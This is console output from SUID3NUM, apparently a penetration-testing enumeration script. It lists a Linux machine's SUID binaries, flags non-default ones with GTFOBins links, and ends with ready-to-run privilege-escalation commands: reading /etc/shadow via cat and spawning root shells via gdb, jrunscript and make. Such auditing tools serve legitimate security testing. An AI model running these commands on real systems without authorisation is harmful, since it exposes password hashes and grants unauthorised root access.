umar_0x01@b0x:~/Desktop/SUID3NUM$ python suid3num.py 
  ___ _   _ _ ___    _____  _ _   _ __  __ 
 / __| | | / |   \  |__ / \| | | | |  \/  |
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  github@Anon-Exploiter

[#] Finding/Listing all SUID Binaries ..
------------------------------
/snap/snapd/4992/usr/lib/snapd/snap-confine
/snap/core18/1192/bin/mount
/snap/core18/1192/bin/ping
/snap/core18/1192/bin/su
/snap/core18/1192/bin/umount
/snap/core18/1192/usr/bin/chfn
/snap/core18/1192/usr/bin/chsh
/snap/core18/1192/usr/bin/gpasswd
/snap/core18/1192/usr/bin/newgrp
/snap/core18/1192/usr/bin/passwd
/snap/core18/1192/usr/bin/sudo
/snap/core18/1192/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1192/usr/lib/openssh/ssh-keysign
/opt/google/chrome/chrome-sandbox
/bin/umount
/bin/su
/bin/cat
/bin/fusermount
/bin/ping
/bin/mount
/usr/bin/gpasswd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/arping
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware/bin/vmware-vmx-stats
/usr/lib/vmware/bin/vmware-vmx-debug
/usr/lib/vmware/bin/vmware-vmx
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxVolInfo
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/virtualbox/VBoxSDL
/usr/lib/jvm/java-8-openjdk-amd64/bin/jrunscript
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/share/skypeforlinux/chrome-sandbox
/usr/sbin/vmware-authd
/usr/sbin/pppd
/sbin/mount.ecryptfs_private
/home/umar_0x01/make
------------------------------


[!] Default Binaries (Don't bother)
------------------------------
/snap/snapd/4992/usr/lib/snapd/snap-confine
/snap/core18/1192/bin/mount
/snap/core18/1192/bin/ping
/snap/core18/1192/bin/su
/snap/core18/1192/bin/umount
/snap/core18/1192/usr/bin/chfn
/snap/core18/1192/usr/bin/chsh
/snap/core18/1192/usr/bin/gpasswd
/snap/core18/1192/usr/bin/newgrp
/snap/core18/1192/usr/bin/passwd
/snap/core18/1192/usr/bin/sudo
/snap/core18/1192/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1192/usr/lib/openssh/ssh-keysign
/opt/google/chrome/chrome-sandbox
/bin/umount
/bin/su
/bin/fusermount
/bin/ping
/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/arping
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware/bin/vmware-vmx-stats
/usr/lib/vmware/bin/vmware-vmx-debug
/usr/lib/vmware/bin/vmware-vmx
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/virtualbox/VirtualBoxVM
/usr/lib/virtualbox/VBoxNetNAT
/usr/lib/virtualbox/VBoxNetDHCP
/usr/lib/virtualbox/VBoxVolInfo
/usr/lib/virtualbox/VBoxNetAdpCtl
/usr/lib/virtualbox/VBoxHeadless
/usr/lib/virtualbox/VBoxSDL
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/share/skypeforlinux/chrome-sandbox
/usr/sbin/vmware-authd
/usr/sbin/pppd
/sbin/mount.ecryptfs_private
------------------------------


[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/bin/cat
/usr/bin/gdb
/usr/lib/jvm/java-8-openjdk-amd64/bin/jrunscript
/home/umar_0x01/make
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/bin/cat -~> https://gtfobins.github.io/gtfobins/cat/#suid
/usr/bin/gdb -~> https://gtfobins.github.io/gtfobins/gdb/#suid
/usr/lib/jvm/java-8-openjdk-amd64/bin/jrunscript -~> https://gtfobins.github.io/gtfobins/jrunscript/#suid
/home/umar_0x01/make -~> https://gtfobins.github.io/gtfobins/make/#suid
------------------------------


[$] Please try the command(s) below to exploit SUID bin(s) found !!!
------------------------------
[~] /bin/cat /etc/shadow
[~] /usr/bin/gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
[~] /usr/lib/jvm/java-8-openjdk-amd64/bin/jrunscript -e "exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')"
[~] /home/umar_0x01/make -s --eval=$'x:\n\t-'"/bin/sh -p"
------------------------------


[-] Note
------------------------------
If you see any FP in the output, please report it to make the script better! :)
------------------------------
